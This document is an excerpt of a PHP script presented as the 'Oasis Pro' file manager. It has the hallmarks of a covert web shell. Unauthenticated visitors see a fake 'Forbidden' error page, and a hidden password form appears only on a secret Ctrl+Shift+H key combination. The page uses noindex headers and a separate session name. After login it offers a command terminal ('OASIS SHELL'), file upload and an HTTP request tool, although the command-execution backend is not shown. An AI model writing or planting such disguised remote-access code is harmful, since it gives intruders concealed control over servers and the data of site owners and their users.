<?php
/**
 * Oasis Pro Edition - File Manager
 * Compatible with PHP 5.4 - PHP 8.x
 */
ob_start();

$OASIS_ACCESS_PASSWORD_HASH = '$2y$12$.UjpbJLFZXGQpRYhK5hc6.eYl9qmsuDpI.CU0N7jHgufq994tdM1q';
$OASIS_SESSION_IDLE_TIMEOUT = 1800;  // 30 menit tanpa aktivitas
$OASIS_SESSION_MAX_LIFETIME = 43200; // maksimum 12 jam

function oasisAuthSafeEquals($known, $user)
{
    $known = (string)$known;
    $user  = (string)$user;
    ...
    $len = strlen($known);
    if ($len !== strlen($user)) return false;
    $result = 0;
    for ($i = 0; $i < $len; $i++) {
...
function oasisAuthVerifyPassword($password, $hash)
{
    if (function_exists('password_verify')) {
        return password_verify((string)$password, (string)$hash);
    }

    // Fallback untuk PHP 5.4: crypt() dengan salt bcrypt yang sama.
    $calc = @crypt((string)$password, (string)$hash);
    return is_string($calc) && strlen($calc) === strlen($hash) && oasisAuthSafeEquals($hash, $calc);
}

function oasisAuthRandomToken()
{
...
function oasisAuthJson($data, $status)
{
...
// Gunakan session terpisah agar tidak bentrok dengan aplikasi lain di domain.
@ini_set('session.use_only_cookies', '1');
@ini_set('session.use_strict_mode', '1');
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Strict');
$__oasisHttps = (!empty($_SERVER['HTTPS']) && strtolower((string)$_SERVER['HTTPS']) !== 'off');
if ($__oasisHttps) @ini_set('session.cookie_secure', '1');
session_name('OASIS_PRIVATE_SID');
if (session_status() !== PHP_SESSION_ACTIVE) {
    @session_start();
}

if (empty($_SESSION['oasis_login_csrf'])) {
    $_SESSION['oasis_login_csrf'] = oasisAuthRandomToken();
}

$__oasisNow = time();
$__oasisUserAgent = isset($_SERVER['HTTP_USER_AGENT']) ? (string)$_SERVER['HTTP_USER_AGENT'] : '';
$__oasisUserAgentHash = hash('sha256', $__oasisUserAgent);
$__oasisAuthed = !empty($_SESSION['oasis_authenticated']);

if ($__oasisAuthed) {
    $__oasisCreated = isset($_SESSION['oasis_authed_at']) ? (int)$_SESSION['oasis_authed_at'] : 0;
    $__oasisLast    = isset($_SESSION['oasis_last_seen']) ? (int)$_SESSION['oasis_last_seen'] : 0;
    $__oasisUa      = isset($_SESSION['oasis_ua']) ? (string)$_SESSION['oasis_ua'] : '';

    if (
        $__oasisCreated <= 0 ||
        $__oasisLast <= 0 ||
        ($__oasisNow - $__oasisLast) > $OASIS_SESSION_IDLE_TIMEOUT ||
        ($__oasisNow - $__oasisCreated) > $OASIS_SESSION_MAX_LIFETIME ||
        !oasisAuthSafeEquals($__oasisUa, $__oasisUserAgentHash)
    ) {
        $_SESSION = array();
        ...
        $_SESSION['oasis_last_seen'] = $__oasisNow;
    }
}

// Login diproses sebelum kode file manager lain berjalan.
if (isset($_POST['oasis_auth_action']) && $_POST['oasis_auth_action'] === 'login') {
    $csrf = isset($_POST['csrf']) ? (string)$_POST['csrf'] : '';
    $password = isset($_POST['password']) ? (string)$_POST['password'] : '';

    if ($csrf === '' || !oasisAuthSafeEquals((string)$_SESSION['oasis_login_csrf'], $csrf)) {
        oasisAuthJson(array('ok' => false, 'error' => 'Invalid request.'), 400);
    }

    // Session-level throttling sederhana untuk memperlambat brute-force.
    $fails = isset($_SESSION['oasis_login_fails']) ? (int)$_SESSION['oasis_login_fails'] : 0;
    $lockUntil = isset($_SESSION['oasis_lock_until']) ? (int)$_SESSION['oasis_lock_until'] : 0;
    if ($lockUntil > $__oasisNow) {
        oasisAuthJson(array(
            'ok' => false,
            'error' => 'Too many attempts. Try again shortly.',
            'retry_after' => $lockUntil - $__oasisNow
        ), 429);
    }

    if (!oasisAuthVerifyPassword($password, $OASIS_ACCESS_PASSWORD_HASH)) {
        $fails++;
        $_SESSION['oasis_login_fails'] = $fails;
        if ($fails >= 5) {
            $_SESSION['oasis_lock_until'] = $__oasisNow + 30;
            $_SESSION['oasis_login_fails'] = 0;
        }
        // Sedikit delay untuk mengurangi kecepatan brute-force.
        usleep(350000);
        oasisAuthJson(array('ok' => false, 'error' => 'Invalid password.'), 403);
    }

    @session_regenerate_id(true);
    $_SESSION['oasis_authenticated'] = true;
    $_SESSION['oasis_authed_at'] = $__oasisNow;
    $_SESSION['oasis_last_seen'] = $__oasisNow;
    $_SESSION['oasis_ua'] = $__oasisUserAgentHash;
    $_SESSION['oasis_login_fails'] = 0;
    unset($_SESSION['oasis_lock_until']);
    $_SESSION['oasis_login_csrf'] = oasisAuthRandomToken();

    oasisAuthJson(array('ok' => true), 200);
}

// Semua request Oasis wajib melewati autentikasi di atas.
if (!$__oasisAuthed) {
    // Endpoint API tidak pernah boleh dieksekusi tanpa session yang sah.
    if (isset($_GET['api'])) {
        oasisAuthJson(array('ok' => false, 'error' => 'Forbidden'), 403);
    }
    ...
    $__oasisCsrf = htmlspecialchars((string)$_SESSION['oasis_login_csrf'], ENT_QUOTES, 'UTF-8');
    echo '<!doctype html>\n';
    echo '<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">';
    echo '<meta name="robots" content="noindex,nofollow,noarchive"><title>Forbidden</title>';
    echo '<style>';
    echo 'html,body{margin:0;min-height:100%;background:#fff;color:#000}body{padding:8px;font-family:serif;box-sizing:border-box}';
    echo 'h1{font-size:32px;margin:0 0 20px;font-weight:bold}p{font-size:16px;margin:0}';
    echo '#oasisGate{position:fixed;left:42px;top:50%;transform:translateY(-50%);width:320px;padding:18px;background:#fff;border:1px solid #c8c8c8;box-shadow:0 8px 28px rgba(0,0,0,.12);box-sizing:border-box;display:none;font-family:Arial,sans-serif}';
    echo '#oasisGate.show{display:block}#oasisGate h2{font-size:17px;margin:0 0 13px;font-weight:600;color:#111}';
    echo '#oasisGate input{width:100%;height:39px;border:1px solid #aaa;padding:0 10px;box-sizing:border-box;font-size:14px;outline:none;background:#fff;color:#111}';
    echo '#oasisGate input:focus{border-color:#444}#oasisGate button{width:100%;height:39px;margin-top:9px;border:0;background:#222;color:#fff;font-size:14px;cursor:pointer}';
    echo '#oasisGate button:hover{background:#000}#oasisGate button:disabled{opacity:.6;cursor:default}';
    echo '#oasisGateError{display:none;margin:10px 0 0;color:#b00020;font-size:12px;line-height:1.4}';
    echo '@media(max-width:520px){#oasisGate{left:20px;right:20px;width:auto}}';
    echo '</style></head><body>';
    echo '<h1>Forbidden</h1><p>You don\'t have permission to access this resource.</p>';
    echo '<div id="oasisGate" aria-hidden="true"><h2>Authentication Required</h2>';
    echo '<form id="oasisGateForm" autocomplete="off">';
    echo '<input type="hidden" name="oasis_auth_action" value="login">';
    echo '<input type="hidden" name="csrf" value="' . $__oasisCsrf . '">';
    echo '<input id="oasisGatePassword" type="password" name="password" placeholder="Password" autocomplete="current-password" required>'; 
    echo '<button id="oasisGateButton" type="submit">Continue</button>';
    echo '<div id="oasisGateError" role="alert"></div></form></div>';
    echo '<script>(function(){';
    echo 'var g=document.getElementById("oasisGate"),f=document.getElementById("oasisGateForm"),p=document.getElementById("oasisGatePassword"),b=document.getElementById("oasisGateButton"),e=document.getElementById("oasisGateError");';
    echo 'function openGate(){g.classList.add("show");g.setAttribute("aria-hidden","false");setTimeout(function(){p.focus();},30)}';
    echo 'function closeGate(){g.classList.remove("show");g.setAttribute("aria-hidden","true");p.value="";e.style.display="none"}';
    echo 'document.addEventListener("keydown",function(ev){var k=(ev.key||"").toLowerCase();if(ev.ctrlKey&&ev.shiftKey&&k==="h"){ev.preventDefault();ev.stopPropagation();if(g.classList.contains("show")){closeGate()}else{openGate()}return false}if(ev.key==="Escape"&&g.classList.contains("show")){closeGate()}});';
    echo 'f.addEventListener("submit",function(ev){ev.preventDefault();e.style.display="none";b.disabled=true;b.textContent="Checking...";var fd=new FormData(f);fetch(window.location.pathname,{method:"POST",body:fd,credentials:"same-origin",cache:"no-store"}).then(function(r){return r.json().then(function(j){return {s:r.status,j:j}})}).then(function(x){if(x.j&&x.j.ok){window.location.replace(window.location.pathname);return}e.textContent=(x.j&&x.j.error)?x.j.error:"Authentication failed.";e.style.display="block";p.select()}).catch(function(){e.textContent="Authentication failed.";e.style.display="block"}).then(function(){b.disabled=false;b.textContent="Continue"})});';
    echo '})();</script></body></html>';
    exit;
}

// Private area: jangan cache halaman/file manager setelah login.
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('X-Robots-Tag: noindex, nofollow, noarchive');
header('X-Content-Type-Options: nosniff');
...
set_error_handler(function($severity, $message, $file, $line) {
    ...
    @error_log("[OasisPRO] PHP Error [$severity]: $message in $file on line $line");
...
function btQuarantineDir($baseDir)
{
    ...
    if (!$tmp) $tmp = $baseDir;
    $dir = rtrim($tmp, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'oasis_quarantine_' . substr(md5($baseDir), 0, 12);
    if (!is_dir($dir)) {
        @mkdir($dir, 0700, true);
    }
    return $dir;
...
<title>OASIS · <?= $_SERVER['SERVER_NAME'] ?> </title>
...
<header class="topbar">
  ...
  <div class="logo">
    ...
    <div class="logo-text">
      <div class="logo-name">OASIS <em>PRO</em></div>
      <div class="logo-sub">by <b>Jet</b></div>
    </div>
  </div>
    ...
    <div class="modal-body">
      ...
      <div class="term-in-row">
        <div class="term-prompt-area">
          <span class="term-prompt-user">Oasis</span><span class="term-prompt-at">@</span><span class="term-prompt-host">shell</span><span class="term-prompt-colon">:</span><span class="term-prompt-cwd" id="termPromptCwd">~</span>
      ...
      <div style="padding:16px;overflow:auto;flex:1">
        ...
        <div class="sec-panel" data-panel="http">
          <div class="tool-grid">
            ...
            <div class="fg span2"><label>Headers (one per line)</label><textarea id="secHttpHeaders" rows="2" placeholder="User-Agent: OasisSec&#10;Accept: */*"></textarea></div>
...
async function api(action,data={},isForm=false){
  ...
  if (!ct.includes('application/json')) {
    ...
    console.warn('[OasisPRO] Non-JSON response for action=' + action, {status: r.status, contentType: ct, bodyPreview: body.substring(0, 500)});
...
async function loadInfo(){
  try {
    ...
    console.warn('[OasisPRO] loadInfo failed:', e.message);
  }
}
    ...
    for (const file of files) {
        try {
            ...
            if (!ct.includes('application/json')) {
                ...
                console.warn('[OasisPRO] Upload non-JSON response:', {status: response.status, contentType: ct, bodyPreview: body.substring(0, 500)});
...
function openTerm(){
  ...
  if(!o.children.length){
    ...
    banner.innerHTML='<b>OASIS SHELL · v1.0</b>Type a command and press <span class="kbd">Enter</span>. Use <span class="kbd">↑</span>/<span class="kbd">↓</span> for history, <span class="kbd">Ctrl+L</span> to clear.';
...
// ─── View ─────────────────────────────────────────────────────────
function setView(v){
  S.view=v; localStorage.setItem('oasis_view',v);
  $('#btnList').classList.toggle('active',v==='list');
  $('#btnGrid').classList.toggle('active',v==='grid');
  renderList();
}
S.view=localStorage.getItem('oasis_view')||'list';
